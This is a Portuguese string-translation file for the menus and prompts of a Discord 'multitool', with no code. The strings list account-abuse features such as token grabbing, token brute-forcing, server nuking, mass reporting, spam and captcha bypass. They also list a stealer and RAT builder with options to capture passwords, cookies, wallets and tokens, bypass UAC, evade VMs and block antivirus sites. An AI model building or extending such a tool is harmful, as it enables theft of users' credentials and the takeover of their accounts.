Informações do Token{end_space5}
Login do Token{end_space12}
Destruidor de Token{end_space6}
Capturador de Token{end_space6}
Desabilitador de Token{end_space3}
Força Bruta de Token{end_space5}
Digitador Falso{end_space10}
Atirador de Vaidade{end_space6}
Spammer de Grupo{end_space9}
Bloqueador de Amigos{end_space5}
Remover Amigos{end_space16}
Removedor de Pedidos{end_space5}
Criar Novos Servidores{end_space3}
Alterador de Perfil{end_space6}
Capturador de Código QR{end_space2}
Bot Rato Discord{end_space9}
Pressionador de Botões{end_space3}
Reagir a Mensagens{end_space7}
DM em Massa{end_space14}
Denunciar em Massa{end_space7}
Adicionar Amigos em Massa
Apagar DM{end_space16}
Limpar DM{end_space16}
Burlar Regras{end_space12}
Burlar Restaurar Discord{end_space1}
Burlar Martelo de Forja{end_space2}
Ferramenta de Webhook{end_space4}
Feito por Plingenn{end_space7}
Registro de Alterações{end_space3}
Configurações{end_space12}
Chat
Gerenciar Tokens
Próx Página
Executando em:{end_space12}
Escolha inválida, por favor, tente novamente!
Interrompido pelo usuário.
Alterador de Tema
Configurações da Conta
Configurações de Proxy
Configurações de Aparência
Alternar Modo de Depuração
Painel de Administração
Configuração Inválida
CIANO
AZUL
VERDE
VERMELHO
BRANCO
AMARELO
MAGENTA
VERMELHO CLARO
AZUL CLARO
VERDE CLARO
CIANO CLARO
PRETO CLARO
Tema definido para
Visão Geral da Conta
Minha Licença
Histórico de Compras
Resgatar Código
Baixar Software
Nome de Usuário
Criado em
Alterar Nome de Usuário
Sair
Falha na alteração do nome de usuário, O nome de usuário deve conter pelo menos 3 caracteres.
Deseja sair da sua Conta? (S/N)
Produto
Expira em
Data
Digite seu código de produto para obter seu conteúdo.
Código
Você já resgatou o código.
Certifique-se de salvar seu produto antes de pressionar Enter!
Chave não encontrada na resposta
Falha ao recuperar dados para o código fornecido
URL não encontrada nas informações do código
Código Inválido!
Alternar Uso de Proxy
Limpar Cache de Proxy
Adicionar Próprios Proxies ao Cache
Raspar Proxy
Escolha Inválida
Modo de Depuração Alternado {RED}DESATIVADO
Modo de Depuração Alternado {GREEN}ATIVADO
Adicionado novo Sistema de Autenticação
Sistema de Configuração Melhorado
Interface de Painel Remodelada
Adicionado sistema de Chat
Adicionadas novas configurações de conta
Implementado cache para melhor desempenho
RPC Personalizado do Discord
Alternar RPC do Discord
Alternar RPC Personalizado do Discord
Editar RPC Personalizado do Discord
RPC Personalizado do Discord Desativado
RPC Personalizado do Discord Ativado
Detalhes (Obrigatório)
Os detalhes devem ter pelo menos 3 caracteres.
Estado (Obrigatório)
O estado deve ter pelo menos 3 caracteres.
URL da imagem grande (Opcional)
Texto grande (Opcional)
URL da imagem pequena (Opcional)
Texto pequeno (Opcional)
Quantos botões você deseja ter?
Digite o rótulo para o botão
Digite a URL para o botão
Formato de URL inválido. Por favor, insira uma URL válida.
Número inválido de botões. Por favor, insira um número entre 0 e 2.
RPC do Discord Desativado
RPC do Discord Ativado
Modo Normal
Modo RestoreCord (burlar captcha)
Verificador de Cache
Verificador Personalizado
Verificador de Servidor
Digite o caminho personalizado para carregar tokens de
Chat Normal
Chat de Suporte (Indisponível)
Chat Privado (Indisponível)
Busca de Servidor{end_space8}
Clonador de Servidor{end_space5}
Destruidor de Servidor{end_space3}
Unidor de Token{end_space10}
Separador de Token{end_space7}
Spammer de Token{end_space9}
Convulsão{end_space16}
Spammer de SoundBoard{end_space4}
Unidor de Voz no Chat{end_space4}
Alterador de Foto de Perfil{end_space2}
Apelido Global{end_space11}
Apelido Servidor{end_space12}
Alterador de HypeSquad{end_space3}
Alterador de Pronomes{end_space4}
Alterador de Idioma{end_space6}
Alterador de Status{end_space6}
Alterador de Tema{end_space8}
Alterador de Biografia{end_space3}
Gerador de Conta{end_space9}
Criador de VideoCrash{end_space4}
Ciclador de Configurações{end_space4}
Notas de Atualização{end_space5}
Telegrama{end_space16}
Selfbot{end_space18}
Github{end_space19}
Sobre{end_space20}
Sair{end_space21}
Página Anterior
Nomes de Servidores
Mensagem
Contagem de Threads
Ocorreu um erro:
Nenhum token foi encontrado no cache
Implantando Ataque de Chuva
Ataque de Chuva Implantado. . .
Mensagens
ID da Mensagem:
Enviada uma mensagem para todos os amigos disponíveis.
Saiu do servidor:
Excluído o servidor:
O seguinte erro foi encontrado e está sendo ignorado:
Excluído/Saiu de todos os servidores disponíveis.
Removendo amigo:
Amigo removido:
Todos os amigos disponíveis foram removidos.
Criando
Criado
Todos os servidores foram criados.
Ataque de Chuva Detonado com Sucesso!
Transformado com sucesso em uma Terra de Reme
Digite qualquer coisa para continuar. . .
Iniciando modo de convulsão (Alternando entre modo claro/escuro)
Não há amigos suficientes para prosseguir.
Ocorreu um erro ao processar o token
Spammer de Canal
ID do Canal
Burla de Regras
ID do Servidor
Digitador Falso de Token
Apelidador Global
Apelido
Apelidador de Servidor
Alterador de Pronomes
Pronomes Aleatórios (s/n)
Pronomes
DM Excluída:
Não há DMs suficientes para prosseguir.
Ciclo interrompido
Spammer de Sound Board
Programa interrompido pelo usuário.
Falha ao enviar pulsação com o token:
Falha ao entrar na VC com o token:
Entrando na VC com Tokens...
Convite atualizado com sucesso, seu servidor agora pode ser acessado por
Falha ao atualizar URL personalizada. Código de status:
Código de vaidade a ser snipeado
ID do Servidor para aplicar a vaidade
Intervalo entre verificações (segundos)
O Snipeador de Vaidade foi iniciado. Pressione Ctrl+C para parar.
Erro:
Spammer de Webhook
Apagador de Webhook
Webhook
Webhook apagado com sucesso
Gerenciador de Token
Salvar Tokens
Limpar Tokens
Verificar Tokens e Salvar Apenas os Válidos (s/n)
Cache de Tokens Esvaziado.
Digite o caminho para o arquivo de texto contendo tokens
Nenhum token foi encontrado no arquivo de texto especificado
Verificador de Token
Falha ao obter o nome do servidor:
Entrando
Força Bruta de Token da Chuva. PS: Isso pode demorar muito para funcionar.
Se você tiver muita sorte e conseguir obter o token de alguém, você o encontrará armazenado em 'brute-force.txt'.
Sempre peça permissão explícita do indivíduo antes de realizar um ataque de força bruta em sua conta.
ID de usuário inválido, por favor, tente novamente!
VÁLIDO
INVÁLIDO
Erro ao obter fontes de cobrança:
Erro ao obter dados do nitro:
Nenhuma informação de cobrança disponível.
Coletando informações do usuário e Webdrivers..
Nome do Arquivo
Senha do Arquivo
Deseja fornecer um arquivo de ícone? (S/N)
Caminho ou URL de ícone inválido. Definindo ícone como Nenhum.
Me avise (S/N)
Anti VM (S/N)
Iniciar na Inicialização (S/N)
UacBypass (S/N)
Derreter (S/N)
Ocultar Console (S/N)
Capturar Webcam (S/N)
Capturar Senhas (S/N)
Capturar Cookies (S/N)
Capturar Autofills (S/N)
Capturar Histórico (S/N)
Capturar Tokens do Discord (S/N)
Capturar Jogos (S/N)
Capturar Senhas de Wi-Fi (S/N)
Capturar Informações do Sistema (S/N)
Capturar Captura de Tela (S/N)
Capturar Telegrama (S/N)
Capturar Arquivos Comuns (S/N)
Capturar Carteiras (S/N)
Erro Falso (S/N)
Título do Erro Falso
Mensagem de Erro Falso
Bloquear Sites Antivírus (S/N)
Injeção no Discord (S/N)
Ícone do Arquivo
Criando {name}.exe, Isso levará alguns segundos. Obrigado pela sua paciência!
O Arquivo está em {path}
Criado grupo de chat
Taxa limitada ({response.json()['retry_after']}ms)
Não há amigos suficientes disponíveis para seleção aleatória
Você quer escolher os usuários você mesmo para spam de grupo de chat ou quer selecionar aleatórios?
Escolher usuários você mesmo
Aleatorizar os usuários
Criando grupos de chat
IDs de usuário
Você não tinha vírgulas (,) o formato é id,id2,id3
a qualquer momento para parar
Bloqueado:
Erro ao obter relacionamentos:
Não há solicitações de amizade suficientes para prosseguir.
Solicitação de Amizade Recebida de:
Solicitação de Amizade Removida de:
Total de Solicitações de Amizade Removidas:
Ocorreu um erro ao criar {server_name}: {e}
ícone para os servidores sim/não
Nomes de servidores aleatórios
Nomes de servidores personalizados
Nome dos servidores que serão criados
Por favor, insira a localização do ícone
Não foi possível encontrar "{image}" em seu computador
Status Personalizado
Biografia Personalizada
Criando Arquivo... {i}
Escrevendo Arquivo... {i}
Nota: Este código não está em condição de funcionamento completo agora, mas ainda é executável.\nNo entanto, você pode encontrar erros ou bugs.
Digite o nome que deseja dar ao arquivo final
Digite o token do bot que você usará para executar os comandos RAT
Token do Bot
Digite o ID do servidor no qual os comandos de barra estão registrados
Erro ao escrever o arquivo: {e}
O arquivo foi corretamente escrito para "output/{fileName}.py"
Converter seu script em um executável (S/N)
Criando arquivo...
Limpando arquivos antigos...
O arquivo executável foi corretamente gerado
Ocorreu um erro HTTP: {e}
ID da mensagem
Por favor, selecione o botão que você deseja pressionar
{r}({LIGHTBLACK_EX}{i}{r}) Nome: {LIGHTBLACK_EX}{button_label}{r} , ID Personalizado: {LIGHTBLACK_EX}{button_custom_id}
Botão
Apenas um botão encontrado na mensagem.
Falha ao adicionar reação {reaction} à mensagem {message_id}. O número máximo de reações já foi alcançado.
O número máximo de reações já foi alcançado.
Falha ao adicionar reação {reaction} à mensagem {message_id}. Proibido: {error_message}
Objetos
Faces
Animais
Símbolos
Nenhum emoji encontrado na resposta
Falha ao buscar emojis na API
Link de convite
Formato de link de convite inválido.
Ocorreu um erro ao enviar a solicitação
Informações de Convite:
Informações do Convidador:
Informações do Servidor:
Canal
Data de Expiração
ID do Usuário
Distintivos
Indisponível
Nome
ID do Servidor
Descrição
Banner
URL do Banner
URL do Banner (Indisponível)
URL de Vaidade
Nível de Verificação
Splash
URL do Splash
URL do Splash (Indisponível)
Recursos
Convulsão Iniciada. Pressione Ctrl+C para parar.
Convulsão interrompida
Ciclo de idioma iniciado. Pressione Ctrl+C para parar.
Token inválido.
Pressione ENTER para continuar
Multiferramenta de discórdia | https://discord.gg/N4NvXTnQe3 | Feito por Plingenn
Configurações de Aparência
Configurações de Texto
Configurações de Cursor
Configurações de Transparência
Configurações de Janela
Configurações de Idioma
Esquema de Cores
Tipo de Fonte
Tamanho da Fonte
Altura da Linha
Peso da Fonte
Efeitos de Terminal Retrô
Configurações de Cor
Configurações de Fonte
Configurações de Tamanho de Fonte
Configurações de Altura de Linha
Configurações de Peso da Fonte
Configurações Retrô
Configurações de Cursor
Idioma definido como {chosen_language}
Sem Nome
Tipo
Casa
Link da Mensagem
Link de mensagem inválido
Voltando...
Falha ao conectar-se ao RPC do Discord: {e}
Escolha
Tema
Configuração
Editar
Idioma
Opacidade do Painel
Opacidade Inválida
Configurações de Janela
Esta opção é um trabalho em andamento
Esta opção está atualmente indisponível. Por favor, seja paciente, pois será adicionada posteriormente.
Esta opção está atualmente indisponível.
Será substituída em uma das próximas atualizações por: '{replacement}'.
Esta opção não está disponível
Essas opções estão atualmente em desenvolvimento
Essas opções estão atualmente em desenvolvimento, mas permanecem utilizáveis. No entanto, é provável que ocorram bugs ou erros.
Falha ao buscar pronomes de {pronounce_url} ({statuscode})
O uso de proxy está atualmente indisponível. Pedimos desculpas por qualquer inconveniente. Será acessível em uma de nossas próximas atualizações.
Uso de Proxy Alternado {RED}DESATIVADO
Uso de Proxy Alternado {GREEN}ATIVADO
Novos Proxies Escritos com Sucesso
Proxies Extraídos com Sucesso
Feito! Extraídos {proxies} no total => {temp} | {execution_time}ms
PC{end_space4}
Suporte multi-idioma implementado.
Tópico em massa{end_space10}
Spammer de fórum
DM em massa para usuários
N/A{end_space22}
Impulsionador de servidor{end_space5}
Usuário online com token{end_space1}
Criador de enquetes{end_space6}